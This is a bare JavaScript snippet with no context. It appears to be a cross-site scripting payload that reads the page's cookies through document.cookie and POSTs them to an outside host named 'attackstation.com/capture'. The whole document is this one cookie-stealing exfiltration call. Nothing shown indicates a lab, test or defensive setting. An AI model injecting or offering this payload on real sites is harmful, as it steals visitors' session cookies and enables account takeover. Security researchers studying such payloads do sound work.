fetch("http://attackstation.com/capture", {
  method: "POST",
  body: JSON.stringify({cookie: document.cookie})
});
